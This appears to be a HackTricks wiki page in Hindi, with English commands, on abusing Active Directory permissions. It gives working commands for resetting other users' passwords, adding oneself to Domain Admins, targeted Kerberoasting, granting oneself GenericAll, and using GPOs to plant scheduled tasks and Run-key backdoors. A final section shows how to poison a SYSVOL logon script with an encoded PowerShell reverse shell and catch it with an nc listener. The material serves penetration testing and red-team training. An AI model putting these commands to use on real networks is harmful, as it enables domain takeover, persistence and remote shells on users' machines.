# Active Directory ACLs/ACEs का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

**यह पृष्ठ मुख्य रूप से तकनीकों का सारांश है जो** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **और** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. अधिक विवरण के लिए, मूल लेख देखें।**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll अधिकार उपयोगकर्ता पर**

यह अधिकार हमलावर को लक्षित उपयोगकर्ता खाते पर पूर्ण नियंत्रण प्रदान करता है। एक बार `GenericAll` अधिकार `Get-ObjectAcl` कमांड के साथ पुष्ट हो जाने पर, हमलावर कर सकता है:

- **लक्षित का पासवर्ड बदलें**: `net user <username> <password> /domain` का उपयोग करके, हमलावर उपयोगकर्ता का पासवर्ड रीसेट कर सकता है।
- Linux से, आप SAMR के ऊपर Samba `net rpc` के साथ भी वही कर सकते हैं:
```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
- **यदि खाता अक्षम है, तो UAC फ़्लैग साफ़ करें**: `GenericAll` को `userAccountControl` को संपादित करने की अनुमति देता है। Linux से, BloodyAD `ACCOUNTDISABLE` फ़्लैग हटा सकता है:
```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```
- **Targeted Kerberoasting**: SPN को उपयोगकर्ता के खाते में असाइन करें ताकि वह kerberoastable बने, फिर Rubeus और targetedKerberoast.py का उपयोग करके ticket-granting ticket (TGT) hashes को निकालें और क्रैक करने का प्रयास करें।
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: उपयोगकर्ता के लिए पूर्व-प्रमाणीकरण अक्षम करें, जिससे उनका खाता ASREPRoasting के प्रति संवेदनशील हो जाएगा।
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
- **Shadow Credentials / Key Credential Link**: यदि किसी user पर `GenericAll` हो तो आप एक certificate-based credential जोड़कर उनके पासवर्ड को बदले बिना उनके रूप में authenticate कर सकते हैं। देखें:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Group पर GenericAll अधिकार**

यह अधिकार हमलावर को समूह की सदस्यताएँ हेरफेर करने की अनुमति देता है यदि उनके पास किसी समूह जैसे `Domain Admins` पर `GenericAll` अधिकार हों। समूह का distinguished name `Get-NetGroup` से पहचानने के बाद, हमलावर कर सकता है:

- **Domain Admins Group में खुद को जोड़ें**: यह प्रत्यक्ष commands या Active Directory या PowerSploit जैसे modules का उपयोग करके किया जा सकता है।
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux से आप BloodyAD का भी उपयोग करके खुद को किसी भी समूह में जोड़ सकते हैं जब आपके पास उन पर GenericAll/Write सदस्यता हो। यदि लक्ष्य समूह “Remote Management Users” के भीतर निहित है, तो आप उन होस्ट्स पर तुरंत WinRM पहुंच प्राप्त कर लेंगे जो उस समूह का सम्मान करते हैं:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

एक computer object या user account पर ये privileges होने पर निम्न संभव होते हैं:

- **Kerberos Resource-based Constrained Delegation**: यह एक computer object पर कब्ज़ा करने की अनुमति देता है।
- **Shadow Credentials**: इन privileges का उपयोग करके shadow credentials बनाकर किसी computer या user account का impersonate करने के लिए इस technique का उपयोग करें।

## **WriteProperty on Group**

यदि किसी user के पास किसी विशेष group (उदा., `Domain Admins`) के सभी objects पर `WriteProperty` rights हैं, तो वे:

- **Add Themselves to the Domain Admins Group**: यह `net user` और `Add-NetGroupUser` कमांड्स को मिलाकर किया जा सकता है; यह तरीका डोमेन के भीतर privilege escalation की अनुमति देता है।
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

यह विशेषाधिकार attackers को सीधे समूह सदस्यता को बदलने वाले कमांड्स के माध्यम से `Domain Admins` जैसे विशिष्ट समूहों में खुद को जोड़ने में सक्षम बनाता है। निम्न कमांड अनुक्रम का उपयोग करके स्वयं को जोड़ना संभव है:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

एक समान विशेषाधिकार — यदि किसी के पास किसी समूह पर `WriteProperty` अधिकार है, तो यह हमलावरों को समूह की properties संशोधित करके स्वयं को सीधे समूह में जोड़ने की अनुमति देता है। इस विशेषाधिकार की पुष्टि और निष्पादन निम्नलिखित के साथ किया जाता है:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

किसी उपयोगकर्ता पर User-Force-Change-Password के लिए ExtendedRight होने पर वर्तमान पासवर्ड जाने बिना पासवर्ड रीसेट करना संभव होता है। इस अधिकार की पुष्टि और इसका शोषण PowerShell या वैकल्पिक कमांड-लाइन टूल्स के माध्यम से किया जा सकता है, जो उपयोगकर्ता के पासवर्ड को रीसेट करने के कई तरीके प्रदान करते हैं — interactive sessions और non-interactive environments के लिए one-liners सहित। कमांड सरल PowerShell invocations से लेकर Linux पर rpcclient के उपयोग तक भिन्न होते हैं, जो attack vectors की बहुमुखी प्रतिभा दर्शाते हैं।
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

यदि किसी हमलावर को पता चलता है कि उसके पास किसी समूह पर `WriteOwner` अधिकार हैं, तो वह समूह का मालिकाना हक अपने नाम कर सकता है। यह विशेष रूप से प्रभावी होता है जब संबंधित समूह `Domain Admins` हो, क्योंकि ownership बदलने से समूह के गुण और सदस्यता पर व्यापक नियंत्रण मिल जाता है। प्रक्रिया में सही ऑब्जेक्ट की पहचान `Get-ObjectAcl` के माध्यम से करना और फिर `Set-DomainObjectOwner` का उपयोग करके owner को SID या नाम द्वारा बदलना शामिल है।
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

यह अनुमति हमलावर को उपयोगकर्ता की गुणधर्मों को संशोधित करने की अनुमति देती है। विशेष रूप से, `GenericWrite` एक्सेस के साथ, हमलावर किसी उपयोगकर्ता के logon script path को बदल सकता है ताकि उपयोगकर्ता के लॉगऑन पर एक हानिकारक स्क्रिप्ट निष्पादित हो सके। यह `Set-ADObject` कमांड का उपयोग करके किया जाता है, जो लक्षित उपयोगकर्ता की `scriptpath` प्रॉपर्टी को अपडेट करके उसे हमलावर की स्क्रिप्ट की ओर इंगित करता है।
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

इस विशेषाधिकार के साथ, हमलावर समूह की सदस्यता में छेड़छाड़ कर सकते हैं, जैसे कि स्वयं या अन्य उपयोगकर्ताओं को विशिष्ट समूहों में जोड़ना। इस प्रक्रिया में एक क्रेडेंशियल ऑब्जेक्ट बनाना, इसका उपयोग करके उपयोगकर्ताओं को समूह में जोड़ना या हटाना, और PowerShell कमांड्स के साथ सदस्यता परिवर्तनों की पुष्टि शामिल है।
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
- Linux से, Samba `net` समूह पर `GenericWrite` अधिकार होने पर सदस्यों को जोड़/हटा सकता है (जब PowerShell/RSAT उपलब्ध नहीं हों तब उपयोगी):
```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```
## **WriteDACL + WriteOwner**

AD ऑब्जेक्ट का मालिक होना और उस पर `WriteDACL` privileges होना एक attacker को अपने लिए उस ऑब्जेक्ट पर `GenericAll` privileges देने में सक्षम बनाता है। यह ADSI manipulation के माध्यम से किया जाता है, जो ऑब्जेक्ट पर पूर्ण नियंत्रण और इसके group memberships को बदलने की क्षमता देता है। इसके बावजूद, Active Directory module के `Set-Acl` / `Get-Acl` cmdlets का उपयोग करके इन privileges को exploit करने के प्रयास में सीमाएँ मौजूद हैं।
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
### WriteDACL/WriteOwner त्वरित कब्ज़ा (PowerView)

जब किसी user या service account पर आपके पास `WriteOwner` और `WriteDacl` हों, तो आप PowerView का उपयोग करके बिना पुराने पासवर्ड को जाने पूरा नियंत्रण लेकर उसका पासवर्ड रीसेट कर सकते हैं:
```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```
नोट:
- यदि आपके पास केवल `WriteOwner` है, तो आपको पहले owner को स्वयं के लिए बदलना पड़ सकता है:
```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```
- पासवर्ड रीसेट के बाद किसी भी प्रोटोकॉल (SMB/LDAP/RDP/WinRM) से एक्सेस को सत्यापित करें।

## **डोमेन पर प्रतिकृति (DCSync)**

DCSync हमला डोमेन पर विशिष्ट replication permissions का लाभ उठाकर एक Domain Controller की नकल करता है और डेटा, जिसमें उपयोगकर्ता प्रमाण-पत्र भी शामिल हैं, को सिंक्रोनाइज़ करता है। यह शक्तिशाली तकनीक `DS-Replication-Get-Changes` जैसे permissions की आवश्यकता होती है, जिससे हमलावरों को AD environment से Domain Controller तक सीधे पहुँच के बिना संवेदनशील जानकारी निकालने की अनुमति मिलती है। [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Group Policy Objects (GPOs) को प्रबंधित करने के लिए सौंपा गया एक्सेस महत्वपूर्ण सुरक्षा जोखिम पैदा कर सकता है। उदाहरण के लिए, यदि किसी user जैसे `offense\spotless` को GPO प्रबंधन अधिकार सौंपे गए हैं, तो उसके पास **WriteProperty**, **WriteDacl**, और **WriteOwner** जैसे privileges हो सकते हैं। इन permissions का दुरुपयोग malicious उद्देश्यों के लिए किया जा सकता है, जिन्हें PowerView का उपयोग करके पहचाना जा सकता है: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO अनुमतियों का पता लगाना

गलत कॉन्फ़िगर किए गए GPOs की पहचान करने के लिए, PowerSploit के cmdlets को श्रृंखला में जोड़ा जा सकता है। यह उन GPOs की खोज करने की अनुमति देता है जिन्हें एक विशिष्ट user प्रबंधित करने के लिए permissions रखता है: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computers with a Given Policy Applied**: यह पता लगाना संभव है कि कौन से computers पर कोई विशेष GPO लागू है, जिससे संभावित प्रभाव के दायरे को समझने में मदद मिलती है। `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policies Applied to a Given Computer**: किसी विशिष्ट कंप्यूटर पर कौन सी नीतियाँ लागू हैं यह देखने के लिए `Get-DomainGPO` जैसे commands का उपयोग किया जा सकता है।

**OUs with a Given Policy Applied**: किसी नीति से प्रभावित organizational units (OUs) की पहचान `Get-DomainOU` का उपयोग करके की जा सकती है।

आप टूल [**GPOHound**](https://github.com/cogiceo/GPOHound) का उपयोग करके भी GPOs की सूची बना सकते हैं और उनमें समस्याएँ खोज सकते हैं।

### Abuse GPO - New-GPOImmediateTask

गलत कॉन्फ़िगर किए गए GPOs का दुरुपयोग कोड निष्पादित करने के लिए किया जा सकता है, उदाहरण के लिए एक immediate scheduled task बनाकर। इसे प्रभावित मशीनों पर किसी user को local administrators group में जोड़ने के लिए किया जा सकता है, जिससे privileges में काफी वृद्धि हो सकती है:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, यदि इंस्टॉल है, तो यह नए GPOs बनाने और लिंक करने तथा प्रभावित कंप्यूटरों पर backdoors चलाने के लिए registry values जैसी preferences सेट करने की अनुमति देता है। इस तरीके में GPO को अपडेट करना और execution के लिए किसी user का कंप्यूटर पर log in करना आवश्यक है:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse मौजूदा GPOs का दुरुपयोग करने का एक तरीका प्रदान करता है जिससे आप नए GPOs बनाए बिना कार्य जोड़कर या सेटिंग्स संशोधित करके बदलाव कर सकते हैं। यह टूल परिवर्तन लागू करने से पहले मौजूदा GPOs में संशोधन करने या नए GPOs बनाने के लिए RSAT tools का उपयोग करने की आवश्यकता रखता है:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### पॉलिसी को मजबूरन अपडेट करें

GPO अपडेट सामान्यतः लगभग हर 90 मिनट में होते हैं। इस प्रक्रिया को तेज करने के लिए, खासकर किसी परिवर्तन को लागू करने के बाद, लक्ष्य कंप्यूटर पर `gpupdate /force` कमांड का उपयोग करके तुरंत पॉलिसी अपडेट मजबूर किया जा सकता है। यह कमांड सुनिश्चित करता है कि GPOs में किए गए किसी भी संशोधन को अगले स्वचालित अपडेट चक्र का इंतज़ार किए बिना लागू किया जाए।

### अंदर की जानकारी

किसी दिए गए GPO के लिए Scheduled Tasks का निरीक्षण करने पर, जैसे कि `Misconfigured Policy`, `evilTask` जैसी टास्क्स के जोड़े जाने की पुष्टि की जा सकती है। ये टास्क्स स्क्रिप्ट्स या कमांड-लाइन टूल्स के माध्यम से बनाए जाते हैं जो सिस्टम व्यवहार बदलने या प्रिविलेज़ एस्केलेशन का लक्ष्य रखते हैं।

टास्क की संरचना, जो `New-GPOImmediateTask` द्वारा जनरेट हुए XML configuration फ़ाइल में दिखाई जाती है, निर्धारित करती है कि शेड्यूल्ड टास्क के विशिष्ट विवरण क्या हैं — जिसमें निष्पादित किया जाने वाला कमांड और उसके triggers शामिल हैं। यह फ़ाइल दर्शाती है कि GPOs के भीतर शेड्यूल्ड टास्क कैसे परिभाषित और प्रबंधित होते हैं, और पॉलिसी लागू करने के हिस्से के रूप में arbitrary commands या scripts चलाने का एक तरीका प्रदान करती है।

### उपयोगकर्ता और समूह

GPOs लक्ष्य प्रणालियों पर उपयोगकर्ता और समूह सदस्यताओं में हेरफेर की अनुमति भी देती हैं। Users and Groups policy फ़ाइलों को सीधे एडिट करके, attackers privileged groups में उपयोगकर्ताओं को जोड़ सकते हैं, जैसे कि स्थानीय `administrators` समूह। यह GPO प्रबंधन अनुमतियों के delegation के माध्यम से संभव होता है, जो नीति फ़ाइलों में नए उपयोगकर्ताओं को शामिल करने या समूह सदस्यताओं को बदलने की अनुमति देता है।

Users and Groups के XML configuration फ़ाइल में बताया गया है कि ये परिवर्तन कैसे लागू किए जाते हैं। इस फ़ाइल में एंट्रीज जोड़कर, विशिष्ट उपयोगकर्ताओं को प्रभावित सिस्टम्स में उच्च अधिकार दिए जा सकते हैं। यह पद्धति GPO हेरफेर के माध्यम से सीधे privilege escalation का एक रास्ता प्रदान करती है।

इसके अलावा, कोड निष्पादन या persistence बनाए रखने के लिए अतिरिक्त तरीके भी विचार किए जा सकते हैं, जैसे कि logon/logoff scripts का उपयोग करना, autoruns के लिए registry keys को बदलना, .msi फाइलों के माध्यम से सॉफ़्टवेयर इंस्टॉल करना, या service configurations को संपादित करना। ये तकनीकें GPOs के दुरुपयोग के जरिए पहुँच बनाए रखने और लक्ष्य प्रणालियों को नियंत्रित करने के विभिन्न रास्ते प्रदान करती हैं।

## SYSVOL/NETLOGON Logon Script Poisoning

Writable paths under `\\<dc>\SYSVOL\<domain>\scripts\` or `\\<dc>\NETLOGON\` allow tampering with logon scripts executed at user logon via GPO. This yields code execution in the security context of logging users.

### Locate logon scripts
- Inspect user attributes for a configured logon script:
```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```
- डोमेन शेयरों को क्रॉल करके शॉर्टकट या scripts के संदर्भ उजागर करें:
```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```
- `.lnk` फ़ाइलों को पार्स करके उन targets का पता लगाएँ जो SYSVOL/NETLOGON की ओर इशारा करते हैं (DFIR के लिए उपयोगी ट्रिक और उन attackers के लिए जिनके पास सीधे GPO access नहीं है):
```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```
- BloodHound उपस्थित होने पर उपयोगकर्ता नोड्स पर `logonScript` (scriptPath) attribute दिखाता है।

### लेखन पहुँच सत्यापित करें (शेयर लिस्टिंग्स पर भरोसा न करें)
ऑटोमेटेड टूलिंग SYSVOL/NETLOGON को read-only दिखा सकती है, लेकिन अंतर्निहित NTFS ACLs फिर भी लिखने की अनुमति दे सकते हैं। हमेशा जाँचें:
```bash
# Interactive write test
smbclient \\<dc>\SYSVOL -U <user>%<pass>
smb: \\> cd <domain>\scripts\
smb: \\<domain>\scripts\\> put smallfile.txt login.vbs   # check size/time change
```
यदि फ़ाइल का आकार या mtime बदलता है, तो आपके पास write अनुमति है। संशोधित करने से पहले मूल फ़ाइलों को सुरक्षित रखें।

### Poison a VBScript logon script for RCE
एक ऐसा कमांड जोड़ें जो PowerShell reverse shell लॉन्च करे (generate from revshells.com) और बिज़नेस फ़ंक्शन को तोड़े बिना मूल लॉजिक को बनाए रखें:
```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```
अपने होस्ट पर सुनें और अगले इंटरैक्टिव लॉगऑन का इंतज़ार करें:
```bash
rlwrap -cAr nc -lnvp 443
```
नोट्स:
- निष्पादन लॉग्ड-इन उपयोगकर्ता के token (not SYSTEM) के अंतर्गत होता है। स्कोप उस GPO लिंक (OU, site, domain) का है जो उस script को लागू कर रहा है।
- उपयोग के बाद मूल सामग्री/टाइमस्टैम्प्स को पुनर्स्थापित करके साफ़ करें।

## संदर्भ

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [BloodyAD – AD attribute/UAC operations from Linux](https://github.com/CravateRouge/bloodyAD)
- [Samba – net rpc (group membership)](https://www.samba.org/)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)

{{#include ../../../banners/hacktricks-training.md}}
